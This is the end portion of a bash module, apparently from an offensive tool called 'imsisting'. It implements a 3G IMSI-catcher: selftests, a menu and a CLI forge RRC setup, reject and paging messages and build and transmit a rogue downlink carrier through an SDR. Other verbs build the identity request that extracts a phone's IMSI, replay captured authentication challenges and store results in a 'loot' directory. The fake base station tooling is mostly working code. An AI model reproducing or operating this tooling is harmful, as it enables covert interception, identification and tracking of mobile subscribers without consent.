    # A present integrityCheckInfo sits before the type index; reading the index
    # first calls this measurement report uplinkDirectTransfer, which is the
    # trap the ordering above exists to avoid.
    chk rrc-ic-type     "$(uair_cli_main --parse-rrc ul-dcch:ef56df779a0000 | awk -F'\t' '$1=="message_type"{print $2}')" "measurementReport"
    chk rrc-ic-mac      "$(uair_cli_main --parse-rrc ul-dcch:ef56df779a0000 | awk -F'\t' '$1=="message_authentication_code"{print $2}')" "deadbeef"
    chk rrc-ic-seq      "$(uair_cli_main --parse-rrc ul-dcch:ef56df779a0000 | awk -F'\t' '$1=="rrc_message_sequence_number"{print $2}')" "3"
    # Negation control inside the selftest: the same octets with the top-level
    # type index moved from 3 (rrcConnectionSetup) to 5 (dummy) must be
    # classified as something else, which proves the classifier reads the index.
    chk rrc-negation    "$(uair_cli_main --parse-rrc "dl-ccch:50${up_setup:2}" | awk -F'\t' '$1=="message_type"{print $2}')" "dummy"
    chk rrc-refuse-wait "$(uair_cli_main --build-rrc-reject 'wait=99' >/dev/null 2>&1; echo $?)" "2"
    chk rrc-refuse-hex  "$(uair_cli_main --build-paging 'tmsi=zz' >/dev/null 2>&1; echo $?)" "2"
    chk rrc-help-verbs  "$(uair_usage | grep -cE '^  --(build-rrc-setup|build-rrc-reject|build-paging|parse-rrc|help)( |$)')" "5"

    # The transmit half. It is asserted here rather than only in the tools it
    # calls, because the thing that can go wrong is the join: a carrier built and
    # never named, or a BCH claimed and not carried.
    local tx txb
    tx=$(uair_cli_main --transmit --freq 2140 --seconds 0.01 --no-key 2>/dev/null); local txrc=$?
    chk tx-rc           "$txrc" "3"
    chk tx-sent         "$(printf '%s\n' "$tx" | awk -F'\t' '$1=="sent"{print $2}')" "0"
    chk tx-status       "$(printf '%s\n' "$tx" | awk -F'\t' '$1=="status"{print $2}')" "handoff"
    chk tx-not-a-cell   "$(printf '%s\n' "$tx" | awk -F'\t' '$1=="carrier_is_a_cell"{print $2}' | cut -d' ' -f1)" "no"
    chk tx-carrier-file "$([[ -s "$(printf '%s\n' "$tx" | awk -F'\t' '$1=="carrier"{print $2}')" ]] && echo yes || echo no)" "yes"
    chk tx-psc-refused  "$(uair_cli_main --transmit --freq 2140 --psc 512 --no-key >/dev/null 2>&1; echo $?)" "2"
    chk tx-freq-refused "$(uair_cli_main --transmit --no-key >/dev/null 2>&1; echo $?)" "2"
    txb=$(uair_cli_main --transmit --freq 2140 --seconds 0.01 --bch-hex 012345 --no-key 2>/dev/null)
    chk tx-bch-carried  "$(printf '%s\n' "$txb" | awk -F'\t' '$1=="carrier_is_a_cell"{print $2}' | cut -d' ' -f1)" "partly"
    chk tx-bch-file     "$([[ -s "$(printf '%s\n' "$txb" | awk -F'\t' '$1=="bch_file"{print $2}')" ]] && echo yes || echo no)" "yes"
    chk tx-bch-short    "$(uair_cli_main --transmit --freq 2140 --bch-hex 0123 --no-key >/dev/null 2>&1; echo $?)" "2"
    # The chain model is a reference: it must be complete and it must not be
    # able to claim a step is built when the verb behind it is absent.
    chk catcher-steps   "$(uair_cli_main --catcher-model | grep -c '^[0-9]')" "8"
    chk catcher-built   "$(uair_cli_main --catcher-model | grep -c 'built:')" "5"
    chk catcher-gap     "$(uair_cli_main --catcher-model | grep -cE 'absent:|partial:|limit:')" "1"
    chk catcher-parse   "$(uair_cli_main --catcher-model | grep -c 'parse:')" "1"
    chk catcher-rc      "$(uair_cli_main --catcher-model >/dev/null 2>&1; echo $?)" "0"
    chk tx-help-verbs   "$(uair_usage | grep -cE '^  --(transmit|catcher-model)( |$)')" "2"

    # The two messages the catcher chain was missing. The MM octets are the
    # known answer; the RRC wrapper is only asserted to state its own limit.
    chk id-imsi         "$(uair_cli_main --catcher-identity | awk -F'\t' '$1=="mm_hex"{print $2}')" "05001801"
    chk id-imei         "$(uair_cli_main --catcher-identity --identity imei | awk -F'\t' '$1=="mm_hex"{print $2}')" "05001802"
    chk id-imsi-bare    "$(uair_cli_main --catcher-identity --bare | awk -F'\t' '$1=="mm_hex"{print $2}')" "05001801"
    # The RRC wrapper is pinned to the pycrate transcription of TS 25.331
    # (tools/umts_rrc_oracle.py, 35 checks). The first layout this tree built was
    # refused by the ASN.1 with "bitlen overflow"; these two assertions are what
    # would catch that again.
    chk id-wrapper-hex      "$(uair_cli_main --catcher-identity | awk -F'\t' '$1=="rrc_hex"{print $2}')" "1400060a003002"
    chk id-wrapper-verified "$(uair_cli_main --catcher-identity | awk -F'\t' '$1=="verified"{print $2}' | grep -c 'bit for bit against the pycrate')" "1"
    chk id-txid-bad     "$(uair_cli_main --catcher-identity --txid 9 >/dev/null 2>&1; echo $?)" "2"
    chk auth-replay     "$(uair_cli_main --catcher-auth --rand 00112233445566778899aabbccddeeff --autn ffeeddccbbaa99887766554433221100 | awk -F'\t' '$1=="mm_hex"{print $2}')" "050012211000112233445566778899aabbccddeeff2010ffeeddccbbaa99887766554433221100"
    chk auth-needs-both "$(uair_cli_main --catcher-auth --rand 0011 >/dev/null 2>&1; echo $?)" "2"
    chk auth-not-a-break "$(uair_cli_main --catcher-auth --rand 00112233445566778899aabbccddeeff --autn ffeeddccbbaa99887766554433221100 | grep -c 'not.*an AKA break')" "1"

    rm -rf "$d"
    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

# ── menu ────────────────────────────────────────────────────────────────
uair_menu() {
    local c
    while true; do
        banner
        echo -e "  ${C_MAG}=== UMTS air interface ===${C_RESET}"
        echo -e "  sdr:   ${C_GRN}$(uair_find_sdr || echo none)${C_RESET}"
        echo -e "  stack: ${C_GRN}$(uair_find_umts_stack || echo none)${C_RESET}"
        echo -e "  store: ${C_DIM}$UAIR_SIB_STORE${C_RESET}\n"
        cat << 'M'
  [1]  UARFCN -> frequency
  [2]  frequency -> UARFCN
  [3]  decode a SIB (hex)
  [4]  SIB field map
  [5]  SIB6 neighbour carrier list
  [6]  RRC integrity (UIA1/UIA2) input assembly
  [7]  integrity analysis: what is protected, what is not
  [8]  AKA relay analysis
  [9]  decode RRC from a pcap
  [10] build RRC CONNECTION SETUP (hex, ready for GSMTAP)
  [11] build RRC CONNECTION REJECT
  [12] build PAGING TYPE 1
  [13] parse a received RRC message
  [14] build the downlink carrier (CPICH + SCH, and the BCH if given)
  [15] the IMSI-catcher chain: what is built, what is absent
  [16] build the MM identification request (the message that yields the IMSI)
  [17] build the authentication replay (a captured RAND and AUTN)
  [0]  back

M
        if [[ -n "${IMSISTING_CLI:-}" ]]; then
            echo "[-] menu unavailable in CLI mode" >&2; return 1
        fi
        read -rp "  choice> " c || return 0  # EOF: leave the menu cleanly
        case "$c" in
            1)
                read -rp "  UARFCN> " n
                uair_cmd_uarfcn "$n" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            2)
                read -rp "  frequency MHz> " f
                uair_mhz_to_uarfcn "$f" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            3)
                read -rp "  SIB hex> " h
                uair_cmd_decode_sib "$h" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            4) uair_sib_fields_tsv | column -t -s$'\t' 2>/dev/null
               read -rp "  press enter " _ ;;
            5)
                read -rp "  first UARFCN> " n
                read -rp "  count> " k
                uair_sib6_carriers "$n" "$k" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            6)
                read -rp "  COUNT-I hex> " ci
                read -rp "  FRESH hex> " fr
                read -rp "  DIRECTION (0=ul 1=dl)> " di
                read -rp "  IK hex (32 digits)> " ik
                read -rp "  MESSAGE hex> " ms
                uair_mac_input "$ci" "$fr" "$di" "$ik" "$ms" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            7) uair_integrity_analysis_tsv | column -t -s$'\t' 2>/dev/null
               read -rp "  press enter " _ ;;
            8) uair_cmd_aka_flow | column -t -s$'\t' 2>/dev/null
               read -rp "  press enter " _ ;;
            9)
                read -rp "  pcap path> " p
                uair_decode_pcap "$p"
                read -rp "  press enter " _ ;;
            10) uair_build_rrc_setup "" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            11) uair_build_rrc_reject "" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            12) uair_build_paging "" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            13)
                read -rp "  channel:hex> " h
                uair_parse_rrc "$h" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            14)
                read -rp "  carrier MHz> " f
                read -rp "  PSC (blank = 0)> " ps
                read -rp "  MIB hex (blank = carrier only)> " bh
                umtsa_cmd_transmit --freq "$f" ${ps:+--psc "$ps"} ${bh:+--bch-hex "$bh"} --no-key |
                    column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            15) umtsa_cmd_catcher_model | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            16) umtsa_cmd_identity_request | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            17)
                read -rp "  RAND (32 hex)> " r
                read -rp "  AUTN (32 hex)> " a
                umtsa_cmd_auth_replay --rand "$r" --autn "$a" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            0) return ;;
            *) warn "invalid"; sleep 1 ;;
        esac
    done
}

# ── CLI dispatch ────────────────────────────────────────────────────────
uair_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)     uair_cli_status_tsv ;;
        --uarfcn)         uair_cmd_uarfcn "${1:-}" ;;
        --mhz)            uair_mhz_to_uarfcn "${1:-}" ;;
        --decode-sib)     uair_cmd_decode_sib "${1:-}" ;;
        --sib-fields)     uair_sib_fields_tsv ;;
        --sib6-carriers)  uair_sib6_carriers "${1:-}" "${2:-}" ;;
        --aka-flow)       uair_cmd_aka_flow ;;
        --mac-input)      uair_mac_input "${1:-}" "${2:-}" "${3:-}" "${4:-}" "${5:-}" ;;
        --count-i)        uair_count_i "${1:-}" "${2:-}" ;;
        --integrity-tsv)  uair_integrity_analysis_tsv ;;
        --decode-pcap)    uair_decode_pcap "${1:-}" ;;
        --build-rrc-setup)  uair_build_rrc_setup  "${1:-}" ;;
        --build-rrc-reject) uair_build_rrc_reject "${1:-}" ;;
        --build-paging)     uair_build_paging     "${1:-}" ;;
        --parse-rrc)        uair_parse_rrc        "${1:-}" ;;
        --transmit)         umtsa_cmd_transmit "$@" ;;
        --catcher-model)    umtsa_cmd_catcher_model ;;
        --catcher-identity) umtsa_cmd_identity_request "$@" ;;
        --catcher-auth)     umtsa_cmd_auth_replay "$@" ;;
        --selftest)       uair_selftest ;;
        --help)           uair_usage; return 0 ;;
        --menu)           uair_menu ;;
        *)
            uair_usage >&2
            return 2 ;;
    esac
}

# The usage block is the module's contract with the rest of the tree: the verb
# harvester in tools/ reads one '  --verb' line per command.
uair_usage() {
    cat <<EOF
UMTS Air Interface — UARFCN, SIB decode, RRC integrity, AKA relay analysis

Usage: $0 COMMAND
  --status-tsv                  tool and store state as TSV
  --uarfcn <N>                  UARFCN to carrier frequency in MHz
  --mhz <F>                     carrier frequency to UARFCN
  --decode-sib <hex>            decode a SIB blob
  --sib-fields                  field map for SIB1..SIB18 as TSV
  --sib6-carriers <first> <n>   SIB6 neighbour carrier list
  --aka-flow                    the AKA message flow and attacker positions
  --mac-input <count> <fresh> <dir> <ik> <msg>
                                assemble the UIA1/UIA2 f9 input
  --count-i <hfn> <sn>          COUNT-I = (HFN << 8) | SN
  --integrity-tsv               what is integrity protected, and what is not
  --decode-pcap <pcap>          list RRC messages in a capture
  --build-rrc-setup [conf]      build RRC CONNECTION SETUP octets (DL-CCCH)
  --build-rrc-reject [conf]     build RRC CONNECTION REJECT octets (DL-CCCH)
  --build-paging [conf]         build PAGING TYPE 1 octets (PCCH)
  --parse-rrc <ch>:<hex>        classify and walk a received RRC message

Transmit half (a carrier and the BCH that makes it a cell)
  --transmit --freq <MHz> [--psc <0..511>] [--rate <sps>] [--seconds <s>]
             [--gain <dB>] [--bch-hex <24-bit MIB>] [--no-key]
                                build the downlink; keys a radio only when one
                                answers, otherwise prints the call and hands off
  --catcher-model               the 3G IMSI-catcher chain, step by step, with
                                what is built and what is absent
  --catcher-identity [--identity imsi|imei|imeisv|tmsi] [--txid 0..3]
             [--domain cs|ps] [--bare]
                                the MM IDENTITY REQUEST and its RRC wrapper
  --catcher-auth --rand <32 hex> --autn <32 hex>
                                the MM AUTHENTICATION REQUEST that replays a
                                captured RAND and AUTN (no key is computed)

  --selftest                    verify arithmetic, assemblers and forged RRC octets
  --help                        this usage block
  --menu                        interactive menu

Build config: a file of key=value lines or the same pairs inline as
"k=v,k=v". Keys per verb: tmsi, lac, mcc, mnc, txid, srnc, srnti, drx,
state (setup); tmsi, lac, mcc, mnc, txid, cause, wait (reject); tmsi,
cause, domain, mib (paging). Channels for --parse-rrc: pcch, dl-ccch,
ul-ccch, dl-dcch, ul-dcch.
EOF
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    IMSISTING_CLI=1
    : "${TMP_DIR:=/tmp/imsisting}"
    : "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
    : "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
    : "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
    : "${STATE_DIR:=$IMSISTING_ROOT/state}"
    mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR"
    declare -F banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    declare -F warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    declare -F err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    declare -F ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
    uair_cli_main "$@"
fi
